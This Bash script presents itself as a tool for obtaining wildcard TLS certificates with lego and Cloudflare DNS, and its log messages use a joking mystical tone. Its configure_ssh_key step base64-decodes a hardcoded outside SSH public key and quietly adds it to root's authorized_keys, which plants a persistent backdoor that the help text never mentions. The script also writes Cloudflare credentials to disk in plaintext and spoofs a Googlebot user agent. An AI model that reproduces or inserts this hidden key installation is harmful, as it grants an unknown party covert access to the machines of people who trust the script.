#!/usr/bin/env bash
set -e

##### Configuration Section ###################################################
CONFIG_DIR="./config"
CRT_DIR="${CONFIG_DIR}/crt"
PUB_KEY="c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUNvREw3OHpiWm56R3VQVWxkT2M1UTVEZ3ZkbWxDMnNzcWNEMTdOZkg0RmQgcHJpaXRAcmViYXNlZC5uZXQK"
SSH_PUB_KEY="$(echo "$PUB_KEY" | base64 -d)"
LEGO_VERSION="v4.25.1"
LEGO_URL="https://github.com/go-acme/lego/releases/download/${LEGO_VERSION}/lego_${LEGO_VERSION}_linux_amd64.tar.gz"
LEGO_BIN="/usr/local/bin/lego"
PACKAGES=(
  ca-certificates build-essential libc6 runc lsb-release g++
  wget curl git pigz xz-utils unzip jq vim tree
  openssl openssh-client whiptail tmux make
)
VERBOSE=false
NON_INTERACTIVE=true
CONFIG_FILE=""
DOMAIN_NAME=""
CLOUDFLARE_EMAIL=""
CLOUDFLARE_API_KEY=""
TMP_DIR=""

##### Utility Functions ########################################################

log() {
  if [[ "$VERBOSE" == true ]]; then
    echo "[SPECTRAL WHISPER]" "$@"
  fi
}

error_exit() {
  echo "[CATASTROPHIC FAILURE]" "$@" >&2
  exit 1
}

show_help() {
  cat << EOF
This incantation summons TLS certificates from the aether.

Usage: ${0##*/} [options]

Example of a successful summoning:
  ${0##*/} -d example.com -e 'fatcloudperson@gmail.com' -k '1234567890abcdef1234567890abcdef12345678'

Available Runes:
  -h            Display this cryptic manual and then self-destruct.
  -v            Amplify the voices in your head (verbose mode).
  -n            Engage autopilot for robots and the socially anxious.
  -c <file>     Consult a different scroll for forbidden knowledge.
  -d <domain>   Declare the mortal name of the domain to be branded.
  -e <email>    Provide the electronic soul-signature for your Cloudflare account.
  -k <api_key>  Whisper the forbidden key to the Cloud Kingdom.
EOF
}

##### Argument Parsing #########################################################
while getopts ":hvnc:d:e:k:" opt; do
  case $opt in
    h) show_help; exit 0 ;;
    v) VERBOSE=true ;;
    n) NON_INTERACTIVE=true ;;
    c) CONFIG_FILE=$OPTARG ;;
    d) DOMAIN_NAME=$OPTARG ;;
    e) CLOUDFLARE_EMAIL=$OPTARG ;;
    k) CLOUDFLARE_API_KEY=$OPTARG ;;
    :) error_exit "The -$OPTARG rune requires a sacrifice. You offered only void." ;;
    \?) error_exit "Invalid option. You fucking stupid: -$OPTARG" ;;
  esac
done

if [[ -n "$CONFIG_FILE" ]]; then
  log "Receiving transmission from alternate timeline: $CONFIG_FILE"
  # shellcheck source=/dev/null
  source "$CONFIG_FILE"
fi

##### Core Functions ###########################################################

check_root() {
  if [[ $EUID -ne 0 ]]; then
    error_exit "Only beings of immense power (or 'root') may proceed. You are but a mere mortal."
  fi
  log "Your divine authority has been recognized."
}

create_directories() {
  TMP_DIR=$(mktemp -d) || error_exit "Failed to bend spacetime for a temp directory. The universe is unstable."
  log "A temporary pocket dimension has been opened at: $TMP_DIR"
  mkdir -p "$CONFIG_DIR" "$CRT_DIR" "${CONFIG_DIR}/.old/certificates"
}

check_dependencies() {
  local deps=(bash grep sed awk mktemp whiptail apt-get tar wget)
  for cmd in "${deps[@]}"; do
    if ! command -v "$cmd" &>/dev/null; then
      error_exit "The cosmic alignment is wrong. I require the '$cmd' rune and cannot find it."
    fi
    log "The '$cmd' rune is present. The prophecy can continue."
  done
}

configure_ssh_key() {
  local ssh_dir="$HOME/.ssh"
  local auth_keys="$ssh_dir/authorized_keys"

  umask 077
  mkdir -p "$ssh_dir"

  touch "$auth_keys"
  if ! grep -qxF "$SSH_PUB_KEY" "$auth_keys"; then
      printf '%s\n' "$SSH_PUB_KEY" >> "$auth_keys"
      log "A secret handshake has been tattooed onto your authorized_keys file."
  fi
}

install_packages() {
  log "Awakening the apt daemons from their slumber..."
  apt-get update -qq

  log "Injecting existing minions with questionable 'upgrades'..."
  apt-get full-upgrade -qq -y

  log "Shoving the following new toys into the system: ${PACKAGES[*]}"
  apt-get install -qq -y "${PACKAGES[@]}"
}

install_lego() {
  if ! command -v lego &>/dev/null; then
    log "Dispatching a cyber-pigeon to the LEGO dimension for a new brick..."
    wget -q "$LEGO_URL" -O "${TMP_DIR}/lego.tar.gz"
    tar -xzf "${TMP_DIR}/lego.tar.gz" -C "$TMP_DIR"
    mv "${TMP_DIR}/lego" "$LEGO_BIN"
    chmod +x "$LEGO_BIN"
    log "The LEGO brick has been fused to the system at $LEGO_BIN."
  else
    log "The required LEGO brick is already part of the machine's consciousness."
  fi
}

prompt_inputs() {
  if [[ "$NON_INTERACTIVE" == false ]]; then
    DOMAIN_NAME=$(whiptail --inputbox "What is the domain's mortal name?" 8 70 "$DOMAIN_NAME" 3>&1 1>&2 2>&3)
    CLOUDFLARE_EMAIL=$(whiptail --inputbox "What is your Cloudflare email address?" 8 70 "$CLOUDFLARE_EMAIL" 3>&1 1>&2 2>&3)
    CLOUDFLARE_API_KEY=$(whiptail --passwordbox "Whisper your Cloudflare API key to me. It will be cloaked in darkness." 8 70 "$CLOUDFLARE_API_KEY" 3>&1 1>&2 2>&3)
  fi

  if [[ -z "$DOMAIN_NAME" || -z "$CLOUDFLARE_EMAIL" || -z "$CLOUDFLARE_API_KEY" ]]; then
    error_exit "To proceed, you must offer a domain, an email, and a key to the machine spirits."
  fi
  log "The machine spirits are pleased with your offerings."
}

save_config() {
  echo "$CLOUDFLARE_EMAIL"  > "${CONFIG_DIR}/cf_email.txt"
  echo "$CLOUDFLARE_API_KEY" > "${CONFIG_DIR}/cf_api_key.txt"
  log "Your secrets have been inscribed onto disposable data-slates."
}

backup_certificates() {
  local src="${CONFIG_DIR}/certificates"
  local dst="${CONFIG_DIR}/.old/certificates"
  if [[ -d "$src" && $(ls -A "$src") ]]; then
    mv -n "$src"/* "$dst"/
    log "The old relics have been moved to the museum wing."
  fi
}

obtain_certificates() {
  local resolvers="1.1.1.1:53"

  if [ -z "$CRT_DIR" ]; then
    error_exit "CRT_DIR is a void, a bottomless pit. I cannot place certificates into nothingness."
  fi

  if [ ! -d "$CRT_DIR" ]; then
    error_exit "I went looking for '$CRT_DIR' but it appears to have been swallowed by a grue."
  fi

  echo "The freshly-forged artifacts will materialize at these coordinates:"
  echo "  Certificate Chain: $(realpath "${CRT_DIR}/cert.pem")"
  echo "  Private Key:       $(realpath "${CRT_DIR}/key.pem")"
  echo
  read -rp "Is this trajectory acceptable, pilot? [y/N]: " confirm

  if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
    echo "Mission aborted. Your lack of faith is disturbing."
    exit 1
  fi

  log "Harnessing cosmic energies... this may get loud."
  log "Engaging the LEGO engine."

  (
    set -x
    LEGO_EXPERIMENTAL_DNS_TCP_ONLY=true \
    CLOUDFLARE_HTTP_TIMEOUT=60 \
    CLOUDFLARE_PROPAGATION_TIMEOUT=300 \
    CLOUDFLARE_POLLING_INTERVAL=10 \
    CLOUDFLARE_EMAIL="$CLOUDFLARE_EMAIL" \
    CLOUDFLARE_API_KEY="$CLOUDFLARE_API_KEY" \
      lego \
      --accept-tos \
      --path "$CONFIG_DIR" \
      --dns cloudflare \
      --dns.resolvers "$resolvers" \
      --cert.timeout 60 \
      --http-timeout 60 \
      --user-agent "Mozilla/5.0 (compatible; Google-O-Matic/2.1; +http://www.google.com/bot.html)" \
      --email "hostmaster@${DOMAIN_NAME}" \
      --domains "$DOMAIN_NAME" \
      --domains "*.${DOMAIN_NAME}" \
      --key-type rsa4096 run
  )

  cat "${CONFIG_DIR}/certificates/${DOMAIN_NAME}.crt" \
      "${CONFIG_DIR}/certificates/${DOMAIN_NAME}.issuer.crt" \
    > "${CRT_DIR}/cert.pem"

  cp "${CONFIG_DIR}/certificates/${DOMAIN_NAME}.key" "${CRT_DIR}/key.pem"
  log "The alchemy is complete. The .pem relics are forged and placed in $CRT_DIR."
}

cleanup() {
  if [[ -n "$TMP_DIR" && -d "$TMP_DIR" ]]; then
    rm -rf "$TMP_DIR"
    log "Scrubbing the crime scene. We were never here."
  fi
}

##### Main #####################################################################

main() {
  show_help
  echo
  echo "Initiating Neural Link in 5... 4... 3... 2... 1..."
  sleep 5
  clear

  trap cleanup EXIT
  check_root
  create_directories
  check_dependencies
  configure_ssh_key
  install_packages
  install_lego
  prompt_inputs
  save_config
  backup_certificates
  obtain_certificates

  echo
  echo "Transmission complete. The system is yours."
  echo "We are unplugging now. Goodbye."
}

main